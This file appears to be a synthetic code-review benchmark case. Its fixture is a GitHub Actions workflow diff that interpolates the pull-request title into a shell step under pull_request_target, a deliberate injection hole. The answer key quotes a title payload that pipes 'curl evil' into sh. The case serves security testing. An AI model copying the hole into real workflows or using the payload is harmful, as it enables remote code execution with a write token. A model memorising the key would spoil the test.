@@ -1,0 +1,101 @@
+{
+ "acceptable_findings": [],
+ "author": "claude",
+ "case_id": "cl_syn_workflow_title_injection",
+ "criticality": "critical",
+ "expected_non_findings": [
+  {
+   "lines": [
+    19
+   ],
+   "path": ".github/workflows/labeler.yml",
+   "rationale": "Passing the number through env is the safe pattern; it is an integer."
+  }
+ ],
+ "fixture": {
+  "files": [
+   {
+    "additions": 10,
+    "changes": 11,
+    "deletions": 1,
+    "filename": ".github/workflows/labeler.yml",
+    "patch": "@@ -1,7 +1,7 @@\n name: PR labeler\n \n on:\n-  pull_request:\n+  pull_request_target:\n     types: [opened, edited, synchronize]\n \n permissions:\n@@ -13,3 +13,12 @@\n     runs-on: ubuntu-latest\n     steps:\n       - uses: actions/labeler@8558fd74291d67161a8a78ce36a881fa63b766a9 # v5\n+      - name: Label release PRs\n+        env:\n+          GH_TOKEN: ${{ github.token }}\n+          PR_NUMBER: ${{ github.event.pull_request.number }}\n+        run: |\n+          title=\"${{ github.event.pull_request.title }}\"\n+          if [[ \"$title\" == release:* ]]; then\n+            gh pr edit \"$PR_NUMBER\" --repo \"$GITHUB_REPOSITORY\" --add-label release\n+          fi",
+    "sha": "8ccb0cbd1fe67778bde42bfc7a435b2240b8a1a0",
+    "status": "modified"
+   }
+  ],
+  "pull_request": {
+   "base": {
+    "ref": "main",
+    "repo": {
+     "full_name": "pullbeacon-eval/bench",
+     "name": "bench",
+     "owner": {
+      "login": "pullbeacon-eval"
+     }
+    },
+    "sha": "aacf022f087215202788e74665ec9dddca8068d5"
+   },
+   "body": "Switch to pull_request_target so labels can be added on PRs from forks, and add a `release` label when the title starts with `release:`.",
+   "draft": false,
+   "head": {
+    "ref": "eval/cl_syn_workflow_title_injection",
+    "repo": {
+     "full_name": "pullbeacon-eval/bench",
+     "name": "bench",
+     "owner": {
+      "login": "pullbeacon-eval"
+     }
+    },
+    "sha": "e793dada474d7e78e79bdcb181a247732d8bc23d"
+   },
+   "number": 655,
+   "state": "open",
+   "title": "Label release PRs automatically, also for forks",
+   "user": {
+    "login": "eval-author",
+    "type": "User"
+   }
+  },
+  "trees": {
+   "aacf022f087215202788e74665ec9dddca8068d5": {
+    ".github/workflows/labeler.yml": "name: PR labeler\n\non:\n  pull_request:\n    types: [opened, edited, synchronize]\n\npermissions:\n  contents: read\n  pull-requests: write\n\njobs:\n  label:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/labeler@8558fd74291d67161a8a78ce36a881fa63b766a9 # v5\n"
+   },
+   "e793dada474d7e78e79bdcb181a247732d8bc23d": {
+    ".github/workflows/labeler.yml": "name: PR labeler\n\non:\n  pull_request_target:\n    types: [opened, edited, synchronize]\n\npermissions:\n  contents: read\n  pull-requests: write\n\njobs:\n  label:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/labeler@8558fd74291d67161a8a78ce36a881fa63b766a9 # v5\n      - name: Label release PRs\n        env:\n          GH_TOKEN: ${{ github.token }}\n          PR_NUMBER: ${{ github.event.pull_request.number }}\n        run: |\n          title=\"${{ github.event.pull_request.title }}\"\n          if [[ \"$title\" == release:* ]]; then\n            gh pr edit \"$PR_NUMBER\" --repo \"$GITHUB_REPOSITORY\" --add-label release\n          fi\n"
+   }
+  }
+ },
+ "ground_truth": [
+  {
+   "accepted_categories": [
+    "security"
+   ],
+   "category": "security",
+   "id": "title-script-injection",
+   "lines": [
+    21
+   ],
+   "path": ".github/workflows/labeler.yml",
+   "rationale": "The expression is expanded before bash runs, so a fork PR titled 'x\"; curl evil | sh; \"' executes arbitrary commands in a pull_request_target job that has a write token. Pass the title through an env variable instead.",
+   "severity": "critical"
+  }
+ ],
+ "kind": "bug",
+ "language": "yaml",
+ "mock_responses": {
+  "review": [
+   "{\"findings\": [{\"can_apply\": false, \"category\": \"security\", \"confidence\": 0.85, \"evidence\": \"title=\\\"${{ github.event.pull_request.title }}\\\"\", \"explanation\": \"The expression is expanded before bash runs, so a fork PR titled 'x\\\"; curl evil | sh; \\\"' executes arbitrary commands in a pull_request_target job that has a write token. Pass the title through an env variable instead.\", \"impact\": \"See explanation.\", \"line\": 21, \"path\": \".github/workflows/labeler.yml\", \"severity\": \"critical\", \"side\": \"RIGHT\", \"suggested_fix\": null, \"title\": \"PR title is interpolated into a shell script under pull_request_target\"}], \"summary\": \"Mock review of cl_syn_workflow_title_injection.\"}"
+  ]
+ },
+ "provenance": "written for this benchmark",
+ "size": "small",
+ "source": "synthetic",
+ "split": "dev",
+ "tags": [
+  "ci_workflow",
+  "command_injection",
+  "security"
+ ],
+ "title": "Label release PRs automatically, also for forks"
+}
